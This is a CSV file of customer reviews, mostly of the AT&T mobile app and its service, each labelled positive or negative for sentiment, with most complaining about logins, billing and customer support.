Body,Sentiment
"Login is a nightmare. Take multiple tries and takes forever. 

Won’t let me write a one star review. Says nickname is taken so this is really a zero star review.",negative
Lately whenever I try to log in to my app it’ll load forever and display a blank white page. I’ve uninstalled and installed the app several times but it keeps happening please fix this,negative
"You pretty much need this app if you want to keep track of your service. That ebung said, it is poorly design Ed andcluttered with unnecessary links and items where they shouldn't belong. It gives equal room o n the screen for upgrading your phone as it does your current monthly usage.",negative
Need to submit trade in phone. Cannot find info on how to do it.,negative
"Doesn’t always display correct bill, sometimes showing 0 due and other unpaid, when paid so a quick check of it is useless in my opinion.??",negative
"I’ll be dropping the service. The channel selections are abysmal, & it is just not worth the hassle. For whatever reason, they cannot seem to keep the service consistent. However, it is AT&T, so what would you expect?",negative
"I don’t normally have a difficult time with apps for other accounts, nor did I have a problem with this one in the past. This one is so confusing. I tried to link our 2 accounts, the same time the app was updated. It’s been difficult to sign in, and difficult to navigate to find what I’m looking for.",negative
It transits easier with more appreciable info flow.,positive
I can’t change the date I want to pay my bill ??,negative
Why,negative
"App has been stuck on my bill from November of last year, so I always have to use the mobile site to pay any bills since then. I should delete the app since it does nothing now. Also, as others have stated, I once made the mistake of calling a rep about my plan & she ended up changing my plan even though I specifically said no. She was in there & just went ahead & did it anyway & when I called back later to complain, no one actually changed it back.",negative
sitting in my store using my phone plan because AT&T can’t get their Uverse Internet to work and stay working,negative
Dear. AT&T when I started this service two years ago I was pleased with my service.  but as of them now I’m not because I feel like I’m being overcharged with these ridiculous prices when I purchased these phones and tablets back two years ago they told me I will be getting a discount starting in that same year two months at the purchase I’m very and I’m shopping for new services with a Nother company!!! As u can see I turn to tables off looking for a better company thanks for your service...460.00 last month ridiculous price,negative
The app won’t update. It says to try back in a few minutes. It has been 13 days.,negative
"AT$T is sooooooo slow.  I admit I can stream movies without many interruptions, but there are interruptions and buffering.  If I hadn’t experienced high speed internet with Comcast I probably wouldn’t be this disappointed in AT$T.   Comcast blazes and AT$T dribbles.    
I cancelled Comcast because I hated their monopolistic hold on fast internet, but what a childish move.   Now I have 16-17 months left to suffer with slow Google searches on my phone and computer.    
I turn Wifi off when I use my phone because my cell connection is faster.   
Comcast I’ll be back as soon as I can.   

I wish AT$T would let me out of my contract without the $180 bail.",negative
"I went to go open the app. Froze on “let me see if this is you” send a text message. And then when you hit send code. It doesn’t send and won’t even open the app.

This app has been non stop bug issues and having to delete and re download.",negative
This is so easy and convenient AT&T has and always be my wireless and cellular choice thanks for being great.,positive
It’s not working. Please help.,negative
Doesn’t deserve one star. After waiting for them to get rid of all the ads and having to choose twice to get to my account to pay my bill I deleted app. Been using it for years but will not put up with their relentless ads hawking their overpriced products and pushing TV service I do not want.,negative
Terrible!!!!!,negative
Always have to enter pass word with Touch ID and very very slow.,negative
You make it so very very easy to check my account and of course pay my bill.. even my ex wife could do it.,positive
I reset my password after a back and forth situation and your system still insisted on blocking me which lets me know technology has to improve for some of us to do normal things like pat your bill using the phone you’re paying for. It’s my phone yet the system makes me feel like a thief.,negative
No sirve la aplicación deberían mejorarla,negative
"Write down everything that is discussed because it is never what you are told.  Write time, date and all the details discussed and to whom you spoke",negative
"AT&T Service In Middle Georgia is no better than a string and two cans. They have openly lied about improving service for 5 years. I have a Locked Phone and it would cost 1,000 to replace allowing me to move my service. If AT&T would unlock my phone I would leave in a minute. If you are considering service in Georgia, DONT USE AT&T.",negative
"Really, really BAD",negative
"Buyer beware!!
Approximately two months ago I went to a Sam’s Club where I was called over by a young man who was working for AT&T. Promotional phones buy one get one free. I listen to his pitch, as I was in the market to buy phones for my son and I. You’ve heard the Old saying that if it sounds too good to be true it probably is. Well I should’ve listened. I was told that I could have two brand new iPhones RX. Buy one get one free what’s the offer. The amount was 799.99. They also gave as part of the promotion $100 gift card for each phone. Which would’ve brought the amount down to about $600.00. I thought it was still a pretty good deal since those phones run roughly close to $500 apiece. I asked several questions. Such as was it real unlimited data? Not the kind where they give you a certain amount and then slow it down to where you can’t use it if you’re not by an Internet connection. I was told it is truly unlimited Internet. I also asked if there would be any problem for me to take the phone, after I paid them off if I wanted, and to go to another carrier. I was told there would be no problem once I pay the phones off. Well you get the picture. Dealing with this company has been a nightmare. Not only have a nickeled and dime to me on my bill, They try to put both of my phones on two different accounts. I went from true unlimited data on my last carrier to having three gigs between the two phones each month, and then it slowed down to the point of it being ridiculous. So I decided I would go ahead and pay the phones off. Once the phones were paid off in full , I find out that I have to have service for two months, so as not to have any type of penalties or repercussions per the agreement. Again, not mentioned at signing. They tack on this feature where there is what they call a visual voicemail, roughly $20 a month. You’re not allowed to take that off without defaulting on the contract. That sounds like a great feature only 90% of the voicemails can’t be transcribed, So you’re either getting a half messages or blank spaces where the computer couldn’t make out what was said. So I waited,. Then they make you jump through hoops to get your phone unlocked. That was a really big ordeal. You have to go through a website and put in your information, then you have to wait 24 to 48 hours for AT&T to approve the unlocking up the phone that you now own! Finally I was able to get one of the phones unlocked, my son’s phone, which is not the main phone on the account. But when I tried to get my phone unlocked, lo and behold I find out that their sales person was not honest with me and did not explain how things really were. This is not a buy one get one free phone. I just found out that in order for me to get my phone unlocked, I have one of two options I either have to keep the plan where they will give me credit for the second phone, and continue to use this ridiculous  service where I’m nickel and dime to death, and still have no unlimited Internet or data or I can pay the second phone off and lose all of the credit. In other words they’re charging me $799.99 for the second phone as well. The The customer service person who I talk to, who explained all of this to me, apologize that there was “a misunderstanding about the agreement concerning the phones”. All I can say is WOW!!!! When I called and paid off, what I thought was both phones a month ago, the agent that I talked  to, who took my money said nothing about what I was told today and let me to believe that both phones were ready to be unlocked when I was ready to take care of that. It’s a sad day when a company as big as this treats their customers this way. All I can say to those reading this it’s buyer beware!!!!
Once I decide how to handle this, I will never do business with AT&T in any capacity again!!!
Look I even tried to take the star off that I accidentally tapped, because this company doesn’t deserve any stars, and I can’t even I’m do that! Wow!",negative
The app never works. It is updated and still shuts down every time I open it to use.,negative
"I have not had one bad experience with AT&T they are the best company Iv worked with by far. Awesome ! I would recommend them to anyone,They are the first company I talk about when it comes to phone service and internet !!",positive
When I sign in app keeps taking me to a page that asks for my password which I saved. Very frustrating. I can’t get it to work!  Waste of time!,negative
Trying to pay my bill through this app or  upgrade my phone and never able to. There’s always an issue with this App. It’s only taking up space on my phone. Everything I have to login to my account on my desktop. It’s ridiculous! Going on vacation? Don’t even try using this App to pay your bill.,negative
Horrible service provider! This phone company does not even deserve one star. They do not work with customers or try to help them under any circumstance. They were very rude and not willing to help me at all. So disappointed.,negative
I don’t know why you changed your app. The way it was until this month was awesome. The new one is a pain - more steps just to get to my account and it’s super slow to load. Please fix the bugs and get it working faster! Thank you.,negative
It is crap! Information is wrong all the time. Most of the time it won’t even work. It just twirls the loading signal and nothing ever happens. Not surprised because the internet is crap too!,negative
It was hard to enter the site.  The password would not allow me to hit return,negative
Very confusing and hard to navigate. Hate it,negative
Horrible interface and app often glitches,negative
"Horrible service, liars. I was sold a promotion only to tell me 2 months later that I no longer qualify for promotion. Now it’s too late to return phones and only way out is paying more money. You guys are disgusting. After many years of service I have been disappointed. Unfortunately you all will ruin my credit cuz I will not pay not another cent.",negative
Keeps telling me I have to link my account. I have.  Multiple times.  Just keeps kicking me back out.,negative
It’s a shame how much time and resource is wasted dealing with once what was a great American company.  They can’t get anything right .. They have seen my last dollar,negative
"At&t is the biggest scam ive seen for a phone company, we signed up when there was a deal to buy one iphone and get another free. Well needless to say we have been paying on both this whole time. Everytime we bring it up in the store to employees they say they cant do anything it has to go to the “higher up’s” to get handled. Big shocker, nothing ever got fixed! Getting robbed every month from this company.",negative
Whenever I try to access my account online or on the App my password never works - even though I’ve saved it each time.  It’s beyond annoying to have to go through the hassle of changing every single time.,negative
"I have been with ATT for YEARS and have never had this problem. Customer service is useless. I had an appointment SCHEDULED for today and even received a text confirmation.  Now this bozo is telling me I don’t have an appointment because of an outage so it didn’t get scheduled.  And this is my problem HOW??? And now Pablo is telling me my internet is working fine but it is my U-VERSE that hasn’t been working for 6 days.  I pay too much money for this inconvenience and incompetence!!!!!  Now Anthony is of no help AT ALL. If the appointment was cancelled, then SOMEONE SHOULD HAVE CALLED. You can take my money every month. HORRIBLE COMPANY and the CEO doesn’t care that HIS company treats his customers like crap so long as he gets his money, drives his fancy cars, and take his lavish vacations.",negative
Never in my life seen a company so big where nobody knows what is going on. I could go on for days....,negative
"I ordered internet over the phone last week and wanted to check my order status online, as I selected self installation. Kept getting errors when attempting login online at att.com with my username and password. the error message said that they don’t have that username or account in there records, so I attempted to recover my userid and password. Did that whole process and got the same error, so I started a chat online with customer support. After 2 hours and 4 “specialists” later, they had only attempted for me to reset my password which I had done myself. After those two hours I was told to call the service help line. I called them and again had to reverify everything even though I gave them a case ID number. They then transferred me 2 more times where I had to again reverify my info (even though I already had and had a case Id number) then they told me that my account isn’t active. Which doesn’t make any sense since when I ordered the internet I also setup a userid and password. All I wanted to do was check order status, and I’ve wasted about 3 plus hours just for them to tell me that it’s impossible to login. Literally doesn’t make any sense, and 6 different specialists have done nothing to help. Extremely painful, and it seems like I always have issues trying to do very basic things with att. Extremely frustrating.",negative
"I have been a loyal customer of Att since 2009 I not only have them at home but I also have at my business.My phone service was disconnected after I had made payment arrangements on May 31 until the June the 12 they disconnected my phone and tv service on June 10 and I had to pay the whole amount plus $35 Reactivated Fee plus $5 to use agent. I never been so disappointed because they saw they saw know arrangement on file. I took the young lady name and customer Id down but it was written at work. But they didn’t believe me . So I will tell everyone what Att did and to make sure they get all of the information when they speak to agents. From text to email. Because I think they only want the full payment and the we need to reconnect fee. The supervisor which name is Lathima was had the horrible is customer service.:( 
Will be changing service to either sprint or to Comcast. Have already inquired. So thanks AT&T",negative
"ATT is the worst customer service company in existence. There computer systems are horrible. Somehow an address for a place I’ve never lived was entered into my account. It tools months of hard work totaling 80 hours for me and I had to speak to more than 60 different agents. All because they had a wrong address. I had correct service at my house, but since there was this false address on the account I couldn’t validate my account. 
When my service wasn’t working correctly I called ATT and was told that since I couldn’t validate my account I couldn’t get service either. I was paying extra for service on my account and they wouldn’t fix it. I also couldn’t make changes to the account or cancel the account since I couldn’t validate my ID. Later I found out the house address for this screwed up account. The house was in construction and didn’t even have electricity. So to correct everything ATT put the correct address in. My current working service with a bad address stopped working. I didn’t have service for three days. And they still charged me for the service. No one cared and even though they said it could never happen again-they were wrong. It’s happened again. My service was turned off. Service people were sent to a wrong address again, and the people on the phones are horrible. One even said I never had an account. Save yourself the headache and stay away from ATT. I’ve filed a complaint with FCC. Bad bad company",negative
"Pretty sad that the largest telecom company on the planet can’t provide their customers with a functional, helpful app.",negative
"I am so frustrated by this recent upgrade to AT&T’s app. It is totally inaccessible, despite entering the correct login ID and password. Sometimes, if I am lucky, I can log in on one a particular phone. But the login NEVER works on my other phone or my laptop!  Today, I cannot get into my account on any of my devices. The worst thing is that these new customer support lines are now rerouted to a call center outside of the USA. The reps are nice enough, but they are not yet up to speed to really help. Moreover, they don’t even have access to basic account information to assist in clarifying any issues that you need help with. I work overseas with a fast internet connection connected through satellite with the USA. And, I shouldn’t be struggling like this. As a result, my cellular service was disconnected because I could not log in to set up my payment. I  am so discouraged and disgusted with AT&T. Thanks for making your service inaccessible to those of us serving overseas. We deserve better!",negative
App is basically worthless. You talk about how you upgrade it to what we want. My app has not updated my bill for 13 days. How about this? Make it work correct and then stop screwing with it!! Leave it alone so I can see my bill and usage as of current.,negative
So much for convenience. Can't get anything done in the app. Just spins when attempting to change my package.,negative
"Not as good as previous app. Too slow, more steps",negative
Love your service!,positive
"This app has a mind of its own.  Never works consistently for more than a few days. Seems like I have to update my password every time I try to log in.  Wanted to check and see if my phone had been unlocked, novo. I’ve also been getting pin codes to change my password when I didn’t request one. Terrible app and service.",negative
Super,positive
"Every time I change the main battery, I have to call or go to AT&T to reset password. Can’t wait to get rid of them!!!",negative
"I have my account set to open with my fingerprint but every time I try to pay my bill, I’m asked for a password and told a code will be sent to me. This is annoying and time consuming. What’s the point of paying online if I have to go through this runaround every time. Fix you system to be user friendly!",negative
Terrible customer service. Expensive for just ok service. TV app never works. Billing at works half the time. I had to switch from t-mobile because I was moving. T-mobile May have not had great coverage compared to att but I would take them over att everyday and twice on Sunday.,negative
The app is always down when I try to login and make a payment via att App,negative
"I normally don’t write reviews, but this company has the worst customer service and provides a low service too, sadly I have my wireless, internet and direct tv with this company and it looks like they started with their monopoly game, because I didn’t want to change to their regular satellite tv service they found a way to increase my bill specially internet, I called to review why my bill went from 60 to 112 $ and I was told I had a discount that shouldn’t been applied,I requested to speak to a manager because obviously the lower level range (job) person was “helping” this person told me her supervisor would be calling me to talk about my bill, waited for two weeks and this never happened, I hope att provides better services because their internet speed in my house is ridiculous and what I am paying is ridiculous as well... improve your services att and also your help because is not good at all. Thanks",negative
I want to make a larger payment,negative
"Usually down bad UI, better than AT&T over the phone though.",negative
I much preferred the previous app version.  I can’t find what I want in this version as easily.,negative
"I can never get the app to work when using Touch ID. Even with all the updates, I still can’t get it to work and there’s no explanation as to why or what I’m doing wrong.",negative
They lucky they got one star and that’s all I have to say on this,negative
If u make any changes thru their loyalty department DO NOT BELIEVE THEM make sure u get a email explaining the changes,negative
Can’t seem to get the app to work.,negative
"This is really frustrating I think you guys at At&T,are great but trying to reset my pass word is a pain in the ..,,... I went to reset my password and when it gave me a code, I tryed to enter it, and was sent back to the beginning really frustrated employee",negative
The app is glitching and makes me log out and I can’t log in again,negative
You are going to far to the left!!! There are many of us who are still conservatives and believe in God!!!,negative
"You continued to be unresponsive and unreasonable I left ya!! Bill with Sprint is less than half of your onerous usury, and I have Hulu, Amazon Prime, Tidal, and less cost on phones! Picked up an IPad, earbuds, and Apple Watch too! Still less than you! Great to be able to speak with reps who do not behave as if they cannot make decisions. 

ATT, change your way of doing business and change how you treat your customers.",negative
Hardest webpage to navigate of all pay online webpages   Easier to mail the payment,negative
Since the merger of invoices this app has been a problem. When calling the help desk they act like it’s the first time someone has brought it to their attention.,negative
"Pesimooooooo, no voy a escribir mis experiencias porque los voy a aburrir , pero se lo recomiendo a mis peores amigos para que sufran con el mal servicio",negative
Too many fees to what is already too expensive.,negative
The app is not helpful. It does not load everything at the same time and it rejects my login but I can login via the website. It doesn’t let me activate/register my service and support staff is making a technician come out when there is no need.,negative
????,positive
Used to be better before. Could open up and see data usage and when the bill is due immediately. Now It takes a screen jump and then the log in. The log in doesn’t always work right either and requires a close and re open of the app.,negative
"It’s bad enough to have something thrown in your face you don’t agree with and have to fund it. Is that where AT&T headed. You probably don’t care about my little accounts, but I’m disappointed. Sad ;(",negative
"I have tried logging into my account through the app and the website. On both, the app and website, I am able to put in my credentials. Next, I am asked to verify my identity by having a code sent through text to the phone number on my account. I am able to select the phone number, but the send code button is grayed out and it won’t let me continue to the next screen. 

This has lasted 3 days.",negative
App shows it recognizes my face but will not open. It takes me directly to the reset password screen when I open it. Worked great for 6 months. Now it’s useless.,negative
Your app hasn’t worked for weeks! I always pay my bill on the app. I haven’t gotten a bill in the past month. I had to log on to the actual website to see and pay my bill. I deleted the app and redownloaded it and it won’t even log in to the app. Just had the circle spinning like it’s loading. Trash.,negative
The app never shows my bill and even said my balance was up to date when I had a bill due and now I’m paying it late because when I called the number it also said my bill was paid. But now because none of this works my bill is late. And there is no easy quick fix for any account issues. And the 611 number is a joke!,negative
Do not waste your time with this download. Can not be accessed after multiple tries. Direct has gone downhill after becoming AT&T. Not a good fit. I know many who are leaving for this reason alone. I have just been trying to pay my bill without being charged by doing it with my phone. Impossible!,negative
"I find it difficult to use the app and most times need to call customer service. By comparison, the Verizon app is way easier and intuitive but not this one as It is not user friendly or intuitive. I can never find anything in it!",negative
I have tried to pay my bill on the app many times and it continues to say try back in a few minutes,negative
"8/10 times my Face ID doesn't work with this app! I'm not a big fan of face ID to begin with, but wanted the Iphone XR, so..It’s getting ridiculous to have to enter my password practically everytime I use the My AT&T app! Please fix this!!",negative
"I use the app to make payments, check my data and on special offers. It performs just as expected and doesn’t give me any trouble.",positive
"Customer support doesn’t understand English to well when I was switching over from Verizon and took me 5 calls, maybe more to get situated. 

The store gave me a free iPhone but couldn’t give me a free phone I wanted that was 300 less. 

I got charged an upgrade fee when they give me a phone for starting up when I had to pay another 130 for other random start up fees.

The bill came in WAY higher than expected and makes no sense. It is all vague wording with no explanations on what it really is. The online chat was useless along with the walk through video. 

Got close to using all the date and wanted to see what was eating it up and all it said was “technology”. Ummm what?",negative
I think I’d be better off battling from the other side of the plate with Verizon,negative
AT&T app is frankly the worst i have ever encountered. i would give this app zero stars if it were possible.,negative
"They are the best, never have any problem with customer service and always give me the best promotions",positive
I hate at&t!!! Nothing but issues. I tell all my friends not to switch over.,negative
"The Att app does not help at all. It has multiple glitches, it freezes open even when using the Att internet service. It took five minutes for it to load, and it did not even provided the answer to what I needed to use it for.",negative
Easier to use,positive
I have never had so much difficulty trying to pay my bill as I have this month. It has been both difficult and stressful!,negative
"This app, while constant updates are happening, continues to get worse and worse. It has a Touch ID login that never works. Half the time the app crashes. And it doesn’t always have the most current info. Better to just call or go on line ???????",negative
Worst service and customer service and tech support are rude and not at helpful in resolving issues when you call them. Also they’ll tell someone will call you later to follow up and never do. They are a rip you off sort of company.,negative
AT&T cannot figure out how to properly bill my account. Each month we receive the $23 credit for buying two phone under the buy one get one promo. My bill ends around the 20th of each month but the credit doesn’t hit till after the autopay occurs. Sounds simple and one would think this would just catchup the following month but then AT&T applies the previous credit and provides the current month credit before the autopay occurs. I know in the end I am getting the discount but why can’t a billion dollar company figure out a simple billing process. I have brought this to the attention of sales people and managers at AT&T all who assured me this would be fixed moving forward....it’s not...and at this point can’t wait til the phones are paid off so I can switch to a provider who listens and takes action on what they promise.,negative
"I was told when I purchased my cell phones I could bundle, my house phone, internet, direct tv and cell phones all together and save! BUT I’m paying more than ever! Very disappointed and no one can explain to me why I can’t bundle other than their computer system is being updated but that’s been updating since November of 2018! I did talk to a lady about my direct tv but all the sudden we were disconnected and she never called back. So as far as I know that deal never went through! So I’ll most probably be changing my direct tv to dish because of the cost! Before I agreed to anything it’s like she could no longer hear me and she hung up so that deal fell through!",negative
"Unable to locate overview to access call blocking feature, why so difficult",negative
"Every time I go to pay my bill, my bill is higher than the previous month. Every time I call about this issue, no one seems to know what is happening. Very disappointed. Will never use AT&T again. Will never recommend anyone to use this service.",negative
"I was on a tour of the American National Parks, upon returning, I received an e-mail advising me of an increase in my monthly because of the change I authorized. I never authorized anything. 
Calling Customer Service was a frustrating joke. The CS person continued to text from a script never answering my questions. I requested a supervisor call back. The text returned was our Supervisors do not call Customers.
Finally got a Supervisor call back only to be hung up on by the Supervisor. Supervisor called back and transferred me to sales to upgrade my plan. 
I learned AT&T is blaming the government for the increase. The real answer is forced up selling by AT&T.  Apparently AT&T is moving to 6g and is cancelling all plans that are 4g. But they are giving you free HBO and offering free Direct TV on your phone. 
I do not use my phone in this manner.  Why is one size fits all the only policy. I was told a notice was printed on the last page of my paper bill. The Supervisor was shocked I was not receiving a paper bill.  Remember the BIG campaign AT&T went through to force us into digital billing? 
I have reviewed my last 6 digital Bill’s and can find no notice about any change.
I asked for a transcript of our chat and a letter confirming the change to 6g. I received two blank e-mails. 
I too am a long time AT&T Customer, since 1988. I guess it is time to look for an honest carrier, if there is one around. Thank you AT&T for showing a long time Customer how little Customer Loyalty means to AT&T.",negative
JUST FAT OUT HORRIBLE...,negative
Perhaps the one star rating isn’t fair since I can’t actually review the new features.  The app won’t let me sign in.  It just freezes at the sign in page and you can’t even enter a password.  It’s just stuck.,negative
Im sure the app is great if it actually WORKED!,negative
I have to keep trying to bring it up.,negative
This app doesn’t work on the IPhone XS Max.,negative
I don't know what's going on with Myatt account but I can't pull up hardly anything. I want to go to my ones so I can try and do an upgrade and III cannot pull that part up. Please fix this AT&T..,negative
When I can get in it is a great app most of the time it will not load. Tells me almost there then goes to a blank page. It is hit and miss if I get to check anything,negative
AT&T advertising sounds as though I should be able pay for my phone and my Direct TV both on MyAT&T. Following hours of working with app I am unable to locate Direct payment function. Paying my phone bill works fine. Note: I refuse to use auto pay for Direct TV. It would seem AT&T could do better.,negative
Service is slow and no help on how to unlock SIM card with pin,negative
Navigation is atrocious. When opening the app I’m confronted with ads and product placements. I had to tap to pay my bill then tap my account. I want my account to be the first thing I see which was the case some time ago. Also there are too many security verification steps. If my password was entered then Touch ID should just work every time no matter if cookies are cleared or not. It’s an app on my phone! It’s just plain tough to get to where you want to be. Why when I select usage data am I not shown detailed usage data but have to tap deeper into menus which themselves aren’t clear? Awful app but it’s still the most convenient avenue for paying my bill.,negative
"When using the app, touch ID option, I can’t get past the “Login with saved user ID” page! Everything just stops. Login via thw normal login page works ok.",negative
"The most recent app update has logged me out of my app.  NOW that I have logged back in, I CAN’T see or pay my bill. My bill was due yesterday!  How am I suppose to pay it if I can’t even log on to do so???  This has been inconvenient, and NOT an improvement for your app at all!  Get it together AT&T! ??????",negative
help,negative
I bought 4 phones over a year ago during the BOGO promo. I was told that I would receive a credit for 2 phones on my bill every month. It did not happen and I have seriously called more than 20 times and have had NO resolution! I can’t even cancel my plan and go to another company because I owe for 4 phones!,negative
Trying to link another account and getting no assistance whatsoever .,negative
"I found your service to be very slow and extremely frustrating. Your wait time to speak with the appropriate person lasted over serval hours. Your personal tried to resolve my problems but met with either processing or systems failures.  
I liked your product but your service continues to be your downfall in my experience with your company. I am now with another cable TV company and I would not recommend your service to any of my friends or family.",negative
I signed up in September 2018 for premium and WiFi - all of a sudden in June 2019 I am being billed for HBO and CINEMAX separately - no good response from customer service !!,negative
This app works but is annoying!! It constantly requires updates but the updates erase the log-in and password info. I don’t understand why it is so difficult to log-in! Other apps for banking or credit cards are simple and no hassle. This one is ridiculous! I feel like I’ve updated my log-in and password multiple times. Just keep my information! :-(,negative
It works occasionally and is totally not intuitive.,negative
Bad company always lie,negative
You sent me a text informing me you were  going to allow us to use data for a week and it would not count against our usage because we were in the area in Ohio hit by the tornados which was very nice of you. I watched my data that week and not only did it count toward our data the the next morning of the day after the free week ended I got a text saying you were added a charge to my bill for going over my data. This is unexceptionable and I will be calling someone about this. Thanks for nothing!!!,negative
Since my phone updated last week I haven’t been able to retrieve my information and the loading symbol continuously keeps going and nothing happens. I can’t even see my new bill since I made changes today,negative
It’s bad enough that I constantly have intermittent service outages. Every time I have a complete outage it takes over a week to get an appointment to correct the issue. It unacceptable to go that long with interrupted service. Too much money for such poor product and service!!!!!!!!,negative
It’s a cellphone service app,positive
Direct tv merge into ATT account is the worst app and account migration experience I’ve ever had.  I am cancelling.  What a run around.  Fake Cable,negative
After latest update I am unable to sign in to any of my accounts. I even deleted and reinstalled the app. Keep getting error code “L569”. App is useless now,negative
Can’t connect accounts with out a magic wand.,negative
I log in and it just stalls. It says “we’re almost there!” Or whatever and the screen never changes. I have to open and close it 3 or 4 times and most of the time just give up and go on my laptop,negative
"Madder than a bear that discovered someone took her baby
You people are billing me for free phone",negative
"Our signal strength is so horrible. I have called ATT numerous times and nothing has changed. After 23 years, I’m looking for another carrier to move all of my cellular business to. #ATTFail",negative
The changes made recently make it easier to do what you need done. It’s a whole lot better than the web version. Keep it up!,positive
This app is hard to navigate and confusing for those who have multiple account. It’s a nightmare!,negative
Overall the app is garbage. You can make payments but that’s pretty much the only thing that consistently works. Checking usage and call logs is a total hit or miss experience. When it does work rarely are all the calls and messages shown. It’s like it just picks and chooses which info to display. Close the application and immediately log back in and the usage is totally different. Very unreliable.,negative
Only thing worse than the app is the actual U-verse service.,negative
Why can’t I get into myAT&T app. Every time I tried to get in there is a blank screen?????,negative
I’ve updated the app and the OS am now it won’t let me sign in. Keeps saying check to make sure you are connected to a data plan. Really bad since I use this to track data usage and pay bill.,negative
"Help me!!!!!!
I’m trying to pay my bill!!!!
It’s impossible!!!!
Help me!!!!!",negative
Working good and easy to use,positive
"Yesterday my bill showed $0, 23 days until next payment. I knew it was not correct and today it shows 201.30, 15 days to pay. It’s 6/9/19 and my bill is due 6/14/19.",negative
"I have made two request for the credit manager to call me with no response.
Very poor service!",negative
"Literally just installed the app, go to log in... I KNOW all my info was correct.. but my account gets locked?! RB1057 code my aunt fanny!! R2d2  y’alls shizz and get your act together! Use to be a good company, now so many dang stipulations to every little thing! Getting a ghost to sweat would be easier than dealing with these dang C-C-CR3POS’!! 
So why have it you may ask.. 3 reasons.. one of 2 networks that I can have a non contract decent service, and gets even service/works where I am from?? 
Seriously about to look into that other option however.. cuz yeah.. no...",negative
Since the became direct TV I can’t access my direct Tv online I have to call all the time and it’s been over a year and every time I try to call them they don’t get it and can’t Help !!!!!! I also had a issue where the Hanford store lied to me and they didn’t do anything about it,negative
The cable in my yard for over 3 weeks and still not buried was torn out of the house on a Saturday.  After 2 hours on the phone  and being told I can’t get a “service appointment” until I troubleshoot with them “ troubleshoot?  What reset my modem?  I’m standing in my yard holding the cable in my hand I said.  I ended up transferring 6 or 7 times and in the end I was told I can get a service tech for 4 days.   Soooo sorry I didn’t learn about their lame service a week earlier when I could have canceled all services penalty free.  Still upset a day later and debating whether or not paying the $185 to get rid of them might be worth it.  Think hard about their customer service and how you will be treated before going this route.,negative
"Can’t see my bill most of the time, have to keep refreshing & reloading app",negative
"At one time your app was user friendly. Then you changed it. Then when I just got used to it, it was changed again. Now I can’t even get into it. Every time I try to log in it says loading, it goes back to the beginning. What’s going on?",negative
I absolutely love At&t,positive
"I can’t seem to log into the app, it just spins and spins. Never had this issue before so not sure what’s going on now.",negative
It takes to long for me to log in. Some times I don’t even have the option to manage my network devices.,negative
"I used to use the widget all the time. Now it only shows an error message saying:

“We couldn’t load your data”

What a bummer!",negative
"AT&T is the worst telecom company I’ve ever dealt with. I thought Verizon was bad because of the constant capacity issues. AT&T is worse, because they put NO or the least amount of money back into the services they offer. The “improvements” that have been made to the myAT&T app are: removal of chat in the Support area. It is only now visible in the upgrade screen (go figure). And removal of support options that allow customers to contact support by doing anything other than dialing 611 from your phone. I wish I’d never left Verizon. AT&T is a terrible company, and this app is further proof of that.",negative
I absolutely hate this app. Now that they’ve linked att with Directv I can never find one or the other bill to pay without calling them and getting help. It’s extremely annoying and a waste of time I don’t have. Thinking of changing providers at this point,negative
I hate that some places i have 1 to 2 bars.. the internet is so slow. Things takes forever to load sometimes,negative
This is an app that links you to a webpage. If I wanted to browse the internet I would’ve searched for it online not on the App Store,negative
"I often have trouble getting this app to load, to navigate screens, etc.  I can have full signal and full Wi-Fi and still have it freeze up or not work. Sometimes it does, but most times I have to say “forget it,” and just go online because of this app.",negative
"The widget never shows the correct amount of data. Constantly have to go into the app and see my usage, and even then, the widget doesn’t update. Would give it less stars if possible.",negative
The app as well as online never work correctly,negative
"1. App, Getting too complicated 
2. App, 50% of the time not responsive 
3. App, Into my profile, some links get me to a website with a very old info and unaccustomed.
4. AT&T, Turning in a bad customer service. On Phone, on text and online.
5. AT&T, Stores are turning useless. So much franchise like...
6. AT&T, Offers like “For Ever” not honored. Like, This Will Be The Price For Ever... 
7. Company departments aren’t unified. Each department has quit different info of  client accounts.

AT&T is getting scrambled and disorganized... And DirecTV Now is turning a 3rd grade service...",negative
Why is my bill so high,negative
"Servicio pésimo, a través del App.. la mayoría del tiempo está fuera de servicio..",negative
